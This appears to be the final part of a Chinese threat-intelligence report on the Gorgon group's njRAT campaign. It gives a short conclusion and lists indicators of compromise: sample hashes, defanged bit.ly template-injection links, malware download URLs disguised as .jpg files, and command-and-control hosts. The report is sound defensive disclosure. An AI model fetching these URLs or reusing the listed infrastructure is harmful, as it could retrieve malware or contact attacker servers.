通过本次分析可以得知，截止目前（2020年1月），Gorgon仍在使用一些传统木马进行攻击，例如已经存活多年的njrat，但同时也可以发现，在投递手法、payload加载也已经越来越复杂，在未来的攻击中，多变的诱饵文档，更为复杂的payload解密，将会是目前大多数黑客组织常使用的手段，但也是最节省成本，最有效的手段。

同时可以看到，同一作者（mateus eaea）1月6日编写的木马虽然运行流程、结构和1月3日的木马十分相似，但是已经加了一部分新功能，结合样本中的一些注释和exp字样，说明很有可能该作者目前正在对攻击代码进行更新。



## IOCs

### <a class="reference-link" name="%E5%8E%9F%E5%A7%8B%E6%A0%B7%E6%9C%ACIOCs"></a>原始样本IOCs

原始样本hash：

b9392f059e00742a5b3f796385f1ec3d

模板注入地址：

http[:]//bit[.]ly/2Fivk8q

后续payload下载地址：

http[:]//empresariadohoteleiro.com/janeiro2020/Attack[.]jpg<br>
http[:]//empresariadohoteleiro.com/janeiro2020/srvjaneiro03[.]jpg<br>
http[:]//empresariadohoteleiro.com/janeiro2020/rnpjaneiro03[.]jpg<br>
http[:]//empresariadohoteleiro.com/janeiro2020/njarrobajnr03[.]jpg

后续payload hash：

7fe85327f57691535762dae17c50457e<br>
5962cbe02c9d85de9a26c5d7d3abcf5f<br>
2c610594e3230b15af32874b1676861a<br>
eba6b7e9bab2b63b63cb6080ee83236f<br>
87dc93b61a224d1ec45be29998013ae9

C&amp;C地址：

ducksys[.]ddns[.]org[:]5550

关联样本IOCs

原始样本hash：

102a69fb5cac66179ceca4a01d0c0f48

模板注入地址：

http[:]//bit[.]ly/2T2ofAC

后续payload下载地址：

http[:]//191.239.243.112/documento/cdt[.]jpg<br>
http[:]//191.239.243.112/documento/njexp05jan[.]jpg<br>
http[:]//191.239.243.112/documento/njnyan05jan[.]jpg<br>
http[:]//empresariadohoteleiro[.]com/janeiro2020/rnpjaneiro03[.]jpg<br>
http[:]//empresariadohoteleiro[.]com/janeiro2020/05janeironjexp[.]jpg<br>
http[:]//empresariadohoteleiro[.]com/janeiro2020/05janeironjnyan[.]jpg

后续payload hash：

6eac6bd76c4ce578acc6ed418af54b8b<br>
3d5d4d26b8de82e189ac349604fa8dae<br>
c32e7d0c4bb67313d24919186515e642<br>
31f085cac8dab9b322407e029e016d7b<br>
eba6b7e9bab2b63b63cb6080ee83236f<br>
ade97a3c5b6b95b5e70ba7813a95cc57<br>
73c9e0580d04d9f6c7da396bd70f2799<br>
88d1eafa875664a545d0e6c093455bb0<br>
729ff146ab688a9a571f9eae67a0d12d

C&amp;C：

ducksys[.]ddns[.]org[:]5550<br>
ducksys[.]ddns[.]net[:]5550<br>
ducksys[.]duckdns[.]org[:]5552



## 参考链接

[https://ti.qianxin.com/blog/articles/gorgon-apt-organizes-another-remark-the-twists-and-turns-of-dropbox-to-njrat/](https://ti.qianxin.com/blog/articles/gorgon-apt-organizes-another-remark-the-twists-and-turns-of-dropbox-to-njrat/)
